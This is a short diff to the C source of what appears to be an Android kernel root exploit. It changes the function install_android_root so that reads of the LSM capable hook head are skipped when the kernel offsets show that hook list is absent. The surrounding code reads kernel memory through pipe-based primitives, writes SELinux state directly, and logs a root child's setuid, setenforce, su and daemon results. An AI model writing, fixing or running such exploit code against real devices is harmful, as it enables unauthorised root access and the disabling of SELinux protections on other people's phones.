@@ -423,14 +423,22 @@ int install_android_root(int fd) {
   pr_info("root selinux direct write ok=%d %u->%u\n", selinux_direct_ok,
           selinux_before, selinux_mid);
 
-  capable_head_before = pipe_read64(fd, data_addr(SECURITY_CAPABLE_HEAD));
+  /* SECURITY_CAPABLE_HEAD is only valid where the kernel still uses the LSM
+   * hook list. This 6.12 kernel uses static calls, so off_security_hook_heads
+   * is 0 and the head would alias KIMAGE_TEXT_BASE + 0x40 (the image's PE
+   * timestamp) — a meaningless read. Report 0 instead of a fake value. */
+  if (active_offsets && active_offsets->off_security_hook_heads) {
+    capable_head_before = pipe_read64(fd, data_addr(SECURITY_CAPABLE_HEAD));
+  }
   root_child_done = collect_root_child();
   struct root_report report;
   memset(&report, 0, sizeof(report));
   if (root_shared) {
     report = root_shared->report;
   }
-  capable_head_after = pipe_read64(fd, data_addr(SECURITY_CAPABLE_HEAD));
+  if (active_offsets && active_offsets->off_security_hook_heads) {
+    capable_head_after = pipe_read64(fd, data_addr(SECURITY_CAPABLE_HEAD));
+  }
   pipe_phys_read_data(fd, selinux_addr, &selinux_after, sizeof(selinux_after));
   pr_info("root child result done=%d uid_after=%u setgid=%d/%d setuid=%d/%d "
           "setenforce=%d/%d su=%d/%d daemon=%d wallpaper=%d/%d selinux=%u->%u "
